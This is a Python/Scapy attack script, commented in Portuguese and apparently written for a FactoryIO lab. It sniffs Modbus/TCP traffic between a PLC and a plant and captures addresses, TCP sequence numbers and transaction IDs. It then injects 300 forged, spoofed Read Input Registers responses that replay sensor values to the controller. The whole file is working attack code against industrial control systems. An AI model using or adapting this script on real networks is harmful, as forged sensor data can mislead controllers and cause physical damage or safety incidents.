from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether
import time
import sys


#Iface Varia de acordo com a placa de rede utilizada, neste caso, é a placa de rede wireless do notebook, 
# em que este código foi compilado.
iface_ = "Qualcomm Atheros QCA61x4A Wireless Network Adapter"
loops_de_ataque = 300

# ------------------------ CAPTURA DOS IPs E TAMANHO DO LOOP DE COMUNICAÇÃO ------------------------
print("------------------------ PROCURANDO IP's E TAMANHO DO LOOP ENTRE PLC E PLANTA")

# Função para identificar quando um ciclo completo de mensagens foi capturado
function_codes = set()
transct_ids = set()
loop_msgs = []

def parada_loop_completo(pkt):
    # Extrai o código de função e o ID de transação do pacote Modbus
    func_code = pkt[Raw].load[7]
    trans_id = (pkt[Raw].load[0] << 8) + pkt[Raw].load[1]
    # Verifica se já capturou um ciclo completo de mensagens
    if func_code in function_codes and not trans_id in transct_ids:
         return True
    else:
        function_codes.add(func_code)
        transct_ids.add(trans_id)
        loop_msgs.append(pkt)
        return False
    

# Captura pacotes Modbus/TCP para identificar IPs e ciclo de comunicação
LEITURA_PACOTES_MODBUS = sniff(
    iface=iface_,
    lfilter=lambda x: x.haslayer(Raw) and x.haslayer(TCP) and \
        ((x[Raw].load[2] << 8) + (x[Raw].load[3]) == 0) and (x[TCP].dport == 502 or x[TCP].sport == 502),
    stop_filter=parada_loop_completo
)


# Descobre os IPs do FactoryIO e do CLP a partir dos pacotes capturados
for pkt in loop_msgs:
    if pkt[TCP].dport == 502:
        ip_factoryIO = pkt[IP].dst
        ip_CLP = pkt[IP].src
        MAC_factoryIO = pkt[Ether].dst
        MAC_CLP = pkt[Ether].src
        break

print(f"IP FactoryIO: {ip_factoryIO}")
print(f"IP CLP: {ip_CLP}")
print(f"MAC FactoryIO: {MAC_factoryIO}")
print(f"MAC CLP: {MAC_CLP}")    

# Calcula o tamanho do ciclo de comunicação
tamanho_do_loop = len(function_codes) #Quantidade de tipos de msg em um loop
print(f"Tamanho do loop de comunicação: {tamanho_do_loop} mensagens")

print("------------------------ IP's E TAMANHO DO LOOP ENCONTRADOS")

# ------------------------ INTERCEPTAÇÃO DOS PACOTES DE INTERESSE ------------------------
# Intercepta pacotes Read Input Registers enviados ao PLC
print("------------------------ DETECTANDO LOOP DE QUERRYS ENVIADOS AO PLC")
flag = 1
contador = 0
pacotes_para_coletar = 25

while flag: 

    PACOTES_INTERCEPTADOS = sniff(
        iface=iface_, 
        count= pacotes_para_coletar ,
        lfilter= lambda x: x.haslayer(Raw) and x.haslayer(IP) and x[IP].dst == ip_CLP and x[Raw].load[7]==4
        )
    
    RESPONSE_RIR_1 = PACOTES_INTERCEPTADOS[23] #RESPONSE Read Input Register penultimo loop
    RESPONSE_RIR_2 = PACOTES_INTERCEPTADOS[24] #RESPONSE Read Input Register ultimo loop
    contador += 1 

    try:
        # Verifica se os pacotes capturados são do tipo Read Input Registers
        if b'\x01\x04\x06' in RESPONSE_RIR_1[Raw].load and b'\x01\x04\x06' in RESPONSE_RIR_2[Raw].load:
            print("------------------------ LOOP'S ENCONTRADOS")
            flag = 0
        if contador > 500:
            print("Não foi possível detectar o loop de querrys Write Multiple Coils. Tentando novamente...")
            time.sleep(1.5)
            contador = 0
    except:
            flag =1

print("------------------------ CONSTRUINDO PACOTE DE ATAQUE")

# ------------------------ CÁLCULO DOS CAMPOS TCP PARA O PACOTE DE ATAQUE ------------------------
# Calcula os valores de sequência e reconhecimento para os pacotes de ataque
TAMANHO_SEQ = RESPONSE_RIR_2.seq - RESPONSE_RIR_1.seq
TAMANHO_ACK = RESPONSE_RIR_2.ack - RESPONSE_RIR_1.ack

SEQ_ATAQUE = (RESPONSE_RIR_2.seq + TAMANHO_SEQ)
ACK_ATAQUE = (RESPONSE_RIR_2.ack + TAMANHO_ACK)

#Vetor com valores sniffados do último response
DADOS_LAYER_TPC = {
     'src': RESPONSE_RIR_2[IP].src,
     'dst': RESPONSE_RIR_2[IP].dst,
     'sport': RESPONSE_RIR_2[TCP].sport,
     'dport': RESPONSE_RIR_2[TCP].dport,
     'wnd': RESPONSE_RIR_2[TCP].window,
}

# Monta a camada IP/TCP do primeiro pacote de ataque
CAMADA_TCP_IP_PRIMEIRO_ATAQUE = IP(src=DADOS_LAYER_TPC['src'], dst=DADOS_LAYER_TPC['dst'])/ TCP(dport=DADOS_LAYER_TPC['dport'], 
                                sport=DADOS_LAYER_TPC['sport'], seq=SEQ_ATAQUE, ack=ACK_ATAQUE, window=DADOS_LAYER_TPC['wnd'], 
                                flags="PA")

# Camada Ethernet
CAMADA_ETHERNET = Ether(src=MAC_factoryIO, dst=MAC_CLP, type=0x0800)

#Criação do pacote MODBUS

print("------------------------ CONSTRUINDO LAYER MODBUS")

#Cálculo do transact ID do ataque
Trans_ID = ((RESPONSE_RIR_2[Raw].load[0] << 8) + RESPONSE_RIR_2[Raw].load[1]) + tamanho_do_loop
Protocol_Identifier = (RESPONSE_RIR_2[Raw].load[2] << 8) + RESPONSE_RIR_2[Raw].load[3]
Length = (RESPONSE_RIR_2[Raw].load[4] << 8) + RESPONSE_RIR_2[Raw].load[5]
Unit_ID = RESPONSE_RIR_2[Raw].load[6]
WMC_FUNCTION = RESPONSE_RIR_2[Raw].load[7]
Byte_Count = RESPONSE_RIR_2[Raw].load[8]


sensor_1 = (PACOTES_INTERCEPTADOS[0][Raw].load[9] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[10]
sensor_2 = (PACOTES_INTERCEPTADOS[0][Raw].load[11] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[12]
sensor_3 = (PACOTES_INTERCEPTADOS[0][Raw].load[13] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[14]

Data_Bytes = struct.pack(">3H", sensor_1, sensor_2, sensor_3)
print(Data_Bytes)

print(Trans_ID)

#Criação das layers ModbusTCP e Modbus
class ModbusTCP(Packet):
     name = "MBPA"
     fields_desc = [ ShortField("Transaction_Identifier", Trans_ID),
                     ShortField("Protocol_Identifier", Protocol_Identifier),
                     ShortField("Length", Length),
                     ByteField("Unit_Identifier", Unit_ID)
                     ]


class Modbus(Packet):
     name = "PDU"
     fields_desc = [ XByteField("Function_Code", WMC_FUNCTION),
                     ByteField("Byte_Count", Byte_Count),
                     StrLenField("Data", Data_Bytes, length_from=lambda pkt: pkt.Byte_Count)
                     ]
     
     
#-----------------------------------------------------------------------------------------------------------------------------------------------

#ENVIO DOS PACOTES DE ATAQUE EM LOOP -------------------------------------------------------------------------------------------------------------
print("------------------------ CONCATENANDO LAYERS CRIADAS")

aux1 = 0
i = 1
trans_id_atual = Trans_ID


while aux1 < loops_de_ataque:
    if aux1 == 0:
        #Usa o que já foi construído fora do loop
        camada_eth = CAMADA_ETHERNET
        camada_tcp_ip = CAMADA_TCP_IP_PRIMEIRO_ATAQUE
        camada_modbus_tcp = ModbusTCP()
        camada_modbus = Modbus()
    else:
        #Recalcula valores
        seq_atual = SEQ_ATAQUE + (TAMANHO_SEQ * aux1)
        ack_atual = ACK_ATAQUE + (TAMANHO_ACK * aux1)
        trans_id_atual = Trans_ID + (tamanho_do_loop * aux1)



        sensor_1 = (PACOTES_INTERCEPTADOS[i][Raw].load[9] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[10]
        sensor_2 = (PACOTES_INTERCEPTADOS[i][Raw].load[11] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[12]
        sensor_3 = (PACOTES_INTERCEPTADOS[i][Raw].load[13] << 8) + PACOTES_INTERCEPTADOS[0][Raw].load[14]

        Data_Bytes = struct.pack(">3H", sensor_1, sensor_2, sensor_3)

        i += 1

        if i >= pacotes_para_coletar - 1:
            i = 1

        camada_tcp_ip = IP(src=DADOS_LAYER_TPC['src'], dst=DADOS_LAYER_TPC['dst']) / \
            TCP(dport=DADOS_LAYER_TPC['dport'], sport=DADOS_LAYER_TPC['sport'],
                seq=seq_atual, ack=ack_atual, window=DADOS_LAYER_TPC['wnd'], flags="PA")

        camada_modbus_tcp = ModbusTCP(Transaction_Identifier=trans_id_atual)
        camada_modbus = Modbus(Data=Data_Bytes)

    #Monta o pacote completo
    PACOTE_COMPLETO = camada_eth / camada_tcp_ip / camada_modbus_tcp / camada_modbus

    #Definição de momento para o envio do pacote (Apenas enviar depois do Querry read input register)
    def parar_sniff_envio_pacote(pkt):
        Tran_ID_Anterior_Envio = (pkt[Raw].load[0] << 8) + pkt[Raw].load[1]
        if Tran_ID_Anterior_Envio == trans_id_atual - 1:
            return True
        return False
    
    sniff(
        iface=iface_,
        lfilter=lambda x: x.haslayer(Raw) and x.haslayer(IP) and x[IP].dst == ip_CLP,
        stop_filter=parar_sniff_envio_pacote# prn = lambda x: x.show()
    )


    if aux1 == 0:
        print("------------------------ MOMENTO CERTO DETECTADO, PACOTES SENDO ENVIADOS")
        
    # Envia o pacote de ataque
    time.sleep(0.01385)
    sendp(PACOTE_COMPLETO, iface=iface_, verbose = 0)

    sys.stdout.write(".")
    sys.stdout.flush()
    aux1 += 1


print("\n------------------------ ATAQUE FINALIADO")

print(PACOTE_COMPLETO.show())
#print("------------------------ DADOS DO PACOTE FINAL ENVIADO")

#PACOTE_COMPLETO.show()